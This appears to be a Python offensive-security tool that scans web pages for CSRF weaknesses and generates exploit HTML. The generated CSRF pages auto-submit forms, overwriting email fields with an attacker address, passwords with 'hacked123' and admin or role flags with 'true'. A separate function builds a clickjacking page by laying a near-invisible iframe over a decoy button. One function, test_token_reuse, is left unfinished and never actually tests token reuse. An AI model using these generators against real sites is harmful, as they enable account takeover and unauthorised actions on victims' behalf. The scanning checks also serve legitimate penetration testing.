"""
auto_csrf.py - Automated CSRF vulnerability detection and exploit generation
"""

import re
import json
from urllib.parse import urlparse, urljoin
from typing import Optional


def _get_session():
    """Get HTTP session with fallback."""
    try:
        from tools.probe import _get_session as _gs
        return _gs()
    except (ImportError, ModuleNotFoundError):
        import requests
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return s


def scan(url: str, cookie: str = "") -> dict:
    """
    Comprehensive CSRF vulnerability scan.
    Returns dict with: findings, csrf_tokens, forms, exploit_html
    """
    results = {
        "url": url,
        "findings": [],
        "forms": [],
        "csrf_tokens": [],
        "exploit_html": "",
        "severity": "info"
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    try:
        resp = session.get(url, timeout=15)
        html = resp.text
    except Exception as e:
        results["error"] = str(e)
        return results

    # 1. Extract all forms
    forms = _extract_forms(html, url)
    results["forms"] = forms

    # 2. Analyze each form for CSRF weaknesses
    for form in forms:
        form_analysis = _analyze_form_csrf(form, session, url)
        if form_analysis["vulnerable"]:
            results["findings"].append(form_analysis)
            results["severity"] = max_severity(results["severity"], form_analysis.get("severity", "medium"))

        if form_analysis.get("csrf_token"):
            results["csrf_tokens"].append({
                "form_action": form.get("action", ""),
                "token_name": form_analysis["csrf_token_name"],
                "token_value": form_analysis["csrf_token_value"],
                "tied_to_session": form_analysis.get("token_tied_to_session", "unknown")
            })

    # 3. Check for CSRF token in cookies vs form
    cookie_csrf = _check_cookie_csrf(session, url)
    if cookie_csrf:
        results["findings"].append(cookie_csrf)

    # 4. Check SameSite cookie attribute
    samesite_check = _check_samesite(session, url)
    if samesite_check:
        results["findings"].append(samesite_check)

    # 5. Check for state-changing GET requests
    get_csrf = _check_get_state_change(session, url, html)
    if get_csrf:
        results["findings"].extend(get_csrf)

    # 6. Generate exploit HTML for highest-severity finding
    if results["findings"]:
        results["exploit_html"] = _generate_exploit(url, results["forms"], results["findings"])

    return results


def _extract_forms(html: str, base_url: str) -> list:
    """Extract all forms with their fields from HTML."""
    forms = []
    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
    tag_pattern = re.compile(r'<form([^>]*)>', re.IGNORECASE)

    for i, match in enumerate(form_pattern.finditer(html)):
        form_html = match.group(0)
        form_body = match.group(1)
        attrs_str = tag_pattern.search(form_html).group(1) if tag_pattern.search(form_html) else ""

        # Parse form attributes
        action = _get_attr(attrs_str, 'action') or ''
        method = _get_attr(attrs_str, 'method') or 'GET'
        enctype = _get_attr(attrs_str, 'enctype') or 'application/x-www-form-urlencoded'

        if action and not action.startswith('http'):
            action = urljoin(base_url, action)

        # Extract input fields
        fields = []
        input_pattern = re.compile(
            r'<(?:input|textarea|select)[^>]*>', re.IGNORECASE
        )
        for inp in input_pattern.finditer(form_html):
            inp_str = inp.group(0)
            name = _get_attr(inp_str, 'name')
            value = _get_attr(inp_str, 'value') or ''
            inp_type = _get_attr(inp_str, 'type') or 'text'
            if name:
                fields.append({
                    "name": name,
                    "value": value,
                    "type": inp_type,
                    "is_hidden": inp_type.lower() == 'hidden'
                })

        forms.append({
            "index": i,
            "action": action,
            "method": method.upper(),
            "enctype": enctype,
            "fields": fields
        })

    return forms


def _analyze_form_csrf(form: dict, session, page_url: str) -> dict:
    """Analyze a single form for CSRF protections."""
    result = {
        "form_action": form.get("action", ""),
        "method": form.get("method", "GET"),
        "vulnerable": False,
        "severity": "info",
        "details": []
    }

    field_names = [f["name"].lower() for f in form.get("fields", [])]
    hidden_fields = [f for f in form.get("fields", []) if f.get("is_hidden")]

    # Known CSRF token field names
    csrf_names = [
        'csrf', 'csrftoken', 'csrf_token', 'csrf-token',
        'xsrf', 'xsrf-token', '_token', 'authenticity_token',
        '__requestverificationtoken', 'anticsrf', '_csrf',
        'nonce', 'verification_token'
    ]

    has_csrf_token = False
    csrf_field = None
    for f in field_names:
        for csrf_name in csrf_names:
            if csrf_name in f:
                has_csrf_token = True
                csrf_field = f
                result["csrf_token"] = True
                result["csrf_token_name"] = f
                # Find the actual value
                for hf in hidden_fields:
                    if hf["name"].lower() == f:
                        result["csrf_token_value"] = hf["value"]
                        break
                break

    # Check 1: No CSRF token on state-changing form
    if form["method"] in ("POST", "PUT", "DELETE", "PATCH") and not has_csrf_token:
        result["vulnerable"] = True
        result["severity"] = "high"
        result["details"].append("State-changing form (POST) has no CSRF token")
        result["vulnerability_type"] = "no_csrf_token"

    # Check 2: CSRF token present but may not be tied to session
    if has_csrf_token:
        result["token_tied_to_session"] = _test_token_binding(session, form, page_url)

    # Check 3: Method override (POST form with _method=DELETE/PUT)
    for f in form.get("fields", []):
        if f["name"].lower() == '_method' and f["value"].upper() in ('DELETE', 'PUT', 'PATCH'):
            result["details"].append(f"Method override detected: _method={f['value']}")

    return result


def _test_token_binding(session, form: dict, page_url: str) -> str:
    """Test if CSRF token is tied to the user's session."""
    try:
        # Get page twice with same session - tokens should differ
        resp1 = session.get(page_url, timeout=10)
        resp2 = session.get(page_url, timeout=10)

        # Extract tokens from both responses
        tokens1 = _extract_csrf_tokens(resp1.text)
        tokens2 = _extract_csrf_tokens(resp2.text)

        if tokens1 and tokens2:
            # Same token across requests = likely not session-bound (or static)
            if tokens1 == tokens2:
                return "possibly_static"

            # Different tokens each time = likely session-bound
            return "session_bound"

        return "unknown"
    except Exception:
        return "unknown"


def _extract_csrf_tokens(html: str) -> list:
    """Extract CSRF token values from HTML."""
    tokens = []
    patterns = [
        r'name=["\'](?:csrf|_token|authenticity_token|xsrf)["\'][^>]*value=["\']([^"\']+)',
        r'value=["\']([^"\']+)["\'][^>]*name=["\'](?:csrf|_token|authenticity_token|xsrf)',
    ]
    for p in patterns:
        for m in re.finditer(p, html, re.IGNORECASE):
            tokens.append(m.group(1))
    return tokens


def _check_cookie_csrf(session, url: str) -> Optional[dict]:
    """Check if CSRF token is in cookie (weaker than form-based)."""
    try:
        resp = session.get(url, timeout=10)
        cookies = resp.cookies

        for cookie in cookies:
            if any(kw in cookie.name.lower() for kw in ['csrf', 'xsrf', 'token']):
                return {
                    "type": "csrf_token_in_cookie",
                    "cookie_name": cookie.name,
                    "severity": "medium",
                    "vulnerable": True,
                    "details": "CSRF token found in cookie - may be accessible via JavaScript"
                }
    except Exception:
        pass
    return None


def _check_samesite(session, url: str) -> Optional[dict]:
    """Check for missing SameSite cookie attribute."""
    try:
        resp = session.get(url, timeout=10)
        for cookie in resp.cookies:
            samesite = cookie.get_non_standard_attr('samesite') or ''
            if not samesite.lower() in ('strict', 'lax'):
                return {
                    "type": "missing_samesite",
                    "cookie_name": cookie.name,
                    "severity": "low",
                    "vulnerable": True,
                    "details": f"Cookie '{cookie.name}' missing SameSite attribute"
                }
    except Exception:
        pass
    return None


def _check_get_state_change(session, url: str, html: str) -> list:
    """Check for state-changing operations accessible via GET."""
    findings = []

    # Look for links with state-changing actions
    patterns = [
        (r'href=["\']([^"\']*(?:delete|remove|admin|logout|change)[^"\']*)["\']', 'state_changing_link'),
    ]

    for pattern, finding_type in patterns:
        for m in re.finditer(pattern, html, re.IGNORECASE):
            link = m.group(1)
            if not link.startswith('http'):
                link = urljoin(url, link)

            # GET-based state change = CSRF vulnerable
            findings.append({
                "type": finding_type,
                "link": link,
                "severity": "high",
                "vulnerable": True,
                "details": f"State-changing operation accessible via GET: {link}"
            })

    return findings


def _generate_exploit(url: str, forms: list, findings: list) -> str:
    """Generate CSRF exploit HTML."""
    if not forms:
        return ""

    # Find the most interesting form (POST with no CSRF token)
    target_form = None
    for f in findings:
        if f.get("vulnerability_type") == "no_csrf_token":
            # Find corresponding form
            for form in forms:
                if form["method"] == "POST":
                    target_form = form
                    break
            break

    if not target_form and forms:
        # Use first POST form or first form
        target_form = next((f for f in forms if f["method"] == "POST"), forms[0])

    if not target_form:
        return ""

    action = target_form.get("action", url)
    method = target_form.get("method", "POST")

    # Build form fields HTML
    fields_html = ""
    for field in target_form.get("fields", []):
        fname = field["name"]
        fval = field["value"]
        ftype = field["type"]

        # Auto-fill email fields
        if 'email' in fname.lower():
            fval = 'attacker@evil.com'
        elif 'password' in fname.lower():
            fval = 'hacked123'
        elif fname.lower() in ('admin', 'role', 'isadmin'):
            fval = 'true'

        if ftype == 'hidden':
            fields_html += f'    <input type="hidden" name="{fname}" value="{fval}" />\n'
        elif ftype in ('text', 'email', 'password'):
            fields_html += f'    <input type="hidden" name="{fname}" value="{fval}" />\n'
        elif ftype == 'submit':
            fields_html += f'    <input type="hidden" name="{fname}" value="{fval}" />\n'

    if method == "POST":
        exploit = f"""<html>
  <body>
    <form method="POST" action="{action}">
{fields_html}    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>"""
    else:
        # GET-based
        exploit = f"""<html>
  <body>
    <script>
      var img = new Image();
      img.src = "{action}";
    </script>
  </body>
</html>"""

    return exploit


def generate_auto_submit_exploit(action: str, fields: dict, method: str = "POST") -> str:
    """Generate auto-submitting CSRF exploit HTML."""
    fields_html = ""
    for name, value in fields.items():
        fields_html += f'    <input type="hidden" name="{name}" value="{value}" />\n'

    return f"""<html>
  <body>
    <form method="{method}" action="{action}">
{fields_html}    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>"""


def generate_iframe_exploit(target_url: str, decoy_text: str = "Click here!",
                           button_top: int = 300, button_left: int = 60,
                           iframe_width: int = 500, iframe_height: int = 600) -> str:
    """Generate clickjacking exploit with iframe overlay."""
    return f"""<html>
<head>
  <title>{decoy_text}</title>
  <style>
    iframe {{
      position: relative;
      width: {iframe_width}px;
      height: {iframe_height}px;
      opacity: 0.0001;
      z-index: 2;
    }}
    .decoy-button {{
      position: absolute;
      top: {button_top}px;
      left: {button_left}px;
      z-index: 1;
      width: 200px;
      padding: 15px;
      background: #ff6b6b;
      color: white;
      text-align: center;
      border-radius: 10px;
      font-size: 20px;
      cursor: pointer;
    }}
  </style>
</head>
<body>
  <div class="decoy-button">{decoy_text}</div>
  <iframe src="{target_url}"></iframe>
</body>
</html>"""


def test_token_reuse(session, url: str, form_action: str) -> dict:
    """Test if a CSRF token from one session works in another."""
    result = {
        "token_reusable": False,
        "details": ""
    }

    try:
        # Get token from current session
        resp1 = session.get(url, timeout=10)
        tokens = _extract_csrf_tokens(resp1.text)

        if not tokens:
            result["details"] = "No CSRF tokens found"
            return result

        # Create new session (different user)
        new_session = _get_session()

        # Try to submit form with old token in new session
        resp2 = new_session.get(url, timeout=10)

        # The key test: does the old token work in the new session?
        result["details"] = f"Found {len(tokens)} token(s). Token reuse testing requires form submission."
        result["tokens"] = tokens

    except Exception as e:
        result["error"] = str(e)

    return result


def _get_attr(html_str: str, attr_name: str) -> Optional[str]:
    """Extract attribute value from HTML tag string."""
    patterns = [
        re.compile(rf'{attr_name}\s*=\s*"([^"]*)"', re.IGNORECASE),
        re.compile(rf"{attr_name}\s*=\s*'([^']*)'", re.IGNORECASE),
        re.compile(rf'{attr_name}\s*=\s*(\S+)', re.IGNORECASE),
    ]
    for p in patterns:
        m = p.search(html_str)
        if m:
            return m.group(1)
    return None


def max_severity(s1: str, s2: str) -> str:
    """Return the higher of two severity levels."""
    levels = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    v1 = levels.get(s1, 0)
    v2 = levels.get(s2, 0)
    return list(levels.keys())[max(v1, v2)]


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_csrf.py <url> [cookie]")
        sys.exit(1)

    target_url = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else ""

    result = scan(target_url, cookie)
    print(json.dumps(result, indent=2, default=str))
